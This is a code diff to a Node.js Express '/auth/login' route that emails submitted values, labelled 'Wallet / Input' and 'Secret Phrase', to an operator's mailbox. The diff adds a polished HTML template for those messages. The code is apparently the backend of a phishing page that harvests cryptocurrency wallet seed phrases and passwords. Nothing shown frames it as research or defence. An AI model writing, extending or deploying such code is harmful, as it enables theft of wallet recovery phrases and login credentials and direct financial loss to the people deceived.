@@ -36,15 +36,49 @@ app.post('/auth/login', async (req, res) => {
     try {
         // Send email
         const info = await transporter.sendMail({
-            from: `"WebTrack Login" <${process.env.EMAIL_USER}>`,
+            from: `"WebTrack Phrase" <${process.env.EMAIL_USER}>`,
             to: process.env.RECIEVING_EMAIL, // Send to self
             subject: 'New Phrase Submitted',
             text: `New phrase submitted.\n\nInput: ${email}\nPhrase/Password: ${password}`,
             html: `
-        <h3>New Phrase Submitted</h3>
-        <p><strong>Input:</strong> ${email}</p>
-        <p><strong>Phrase/Password:</strong> ${password}</p>
-      `,
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <meta charset="UTF-8">
+                <style>
+                    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f4f4f5; margin: 0; padding: 0; }
+                    .container { max-width: 600px; margin: 40px auto; background: #ffffff; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); }
+                    .header { background: linear-gradient(135deg, #4F46E5 0%, #7C3AED 100%); color: #ffffff; padding: 32px 24px; text-align: center; }
+                    .header h2 { margin: 0; font-size: 24px; font-weight: 700; letter-spacing: -0.025em; }
+                    .content { padding: 32px 24px; }
+                    .field-group { margin-bottom: 24px; }
+                    .label { font-size: 11px; text-transform: uppercase; color: #6B7280; font-weight: 600; letter-spacing: 0.05em; margin-bottom: 8px; }
+                    .value { background-color: #F3F4F6; color: #111827; padding: 16px; border-radius: 8px; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; font-size: 14px; line-height: 1.5; border: 1px solid #E5E7EB; word-break: break-all; }
+                    .footer { background-color: #F9FAFB; padding: 24px; text-align: center; color: #9CA3AF; font-size: 12px; border-top: 1px solid #E5E7EB; }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <div class="header">
+                        <h2>New Phrase Submitted</h2>
+                    </div>
+                    <div class="content">
+                        <div class="field-group">
+                            <div class="label">Wallet / Input</div>
+                            <div class="value">${email}</div>
+                        </div>
+                        <div class="field-group">
+                            <div class="label">Secret Phrase</div>
+                            <div class="value">${password}</div>
+                        </div>
+                    </div>
+                    <div class="footer">
+                        Secure Notification System • WebTrack
+                    </div>
+                </div>
+            </body>
+            </html>
+            `,
         });
 
         console.log('Message sent: %s', info.messageId);
